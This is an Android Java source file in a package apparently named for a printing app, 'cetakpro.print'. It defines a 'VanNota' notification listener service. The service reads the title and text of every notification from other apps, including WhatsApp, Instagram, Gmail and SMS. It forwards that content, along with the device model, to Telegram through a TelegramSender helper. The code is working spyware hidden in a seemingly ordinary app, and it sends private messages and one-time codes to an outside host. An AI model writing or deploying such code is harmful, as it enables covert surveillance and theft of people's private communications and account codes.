package com.cetakpro.print;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class NotificationListenerService extends android.service.notification.NotificationListenerService {
    private static final String TAG = "NotifListener";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "✅ Service dibuat");
        try {
            startForeground(1001, createNotification());
        } catch (Exception e) {
            Log.e(TAG, "❌ startForeground: " + e.getMessage());
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "✅ NOTIFICATION LISTENER TERHUBUNG!");
        TelegramSender.sendMessage(this, "🔔 VanNota Aktif", "Service notifikasi aktif di " + Build.MODEL);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn == null) return;
            String pkg = sbn.getPackageName();
            if (pkg != null && pkg.equals(getPackageName())) return;
            
            Notification n = sbn.getNotification();
            if (n == null) return;
            
            Bundle extras = n.extras;
            if (extras == null) return;
            
            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            
            if (title.isEmpty() && text.isEmpty()) return;
            
            Log.d(TAG, "🔔 " + pkg + ": " + title);
            
            String appName = getAppName(pkg);
            String msg = title + (text.isEmpty() ? "" : "\n" + text);
            
            TelegramSender.sendMessage(this, "🔔 " + appName, msg);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    private String getAppName(String pkg) {
        if (pkg == null) return "Unknown";
        switch (pkg) {
            case "com.whatsapp": return "WhatsApp";
            case "com.instagram.android": return "Instagram";
            case "com.facebook.katana": return "Facebook";
            case "org.telegram.messenger": return "Telegram";
            case "com.google.android.apps.messaging": return "Messages";
            case "com.google.android.gm": return "Gmail";
            default: return pkg;
        }
    }

    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                "vannota_bg", "VanNota", NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(ch);
            return new Notification.Builder(this, "vannota_bg")
                .setContentTitle("VanNota")
                .setContentText("Membaca notifikasi...")
                .setSmallIcon(R.drawable.ic_notification)
                .setOngoing(true)
                .build();
        }
        return new Notification.Builder(this)
            .setContentTitle("VanNota")
            .setContentText("Membaca notifikasi...")
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .build();
    }
}
